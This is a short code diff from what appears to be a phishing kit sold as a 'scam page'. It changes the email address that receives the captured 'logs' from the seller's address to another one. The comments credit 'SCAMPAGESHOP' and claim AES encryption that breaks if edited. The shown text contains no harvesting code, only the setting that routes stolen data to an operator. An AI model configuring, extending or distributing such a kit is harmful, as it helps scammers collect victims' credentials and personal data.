@@ -1,5 +1,5 @@
 // Type in your email to here👇 (this is where you will get the logs).
-const emailForLogs = "scampageshop@gmail.com";
+const emailForLogs = "alwaysactive772@yandex.com";
 //
 
 //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
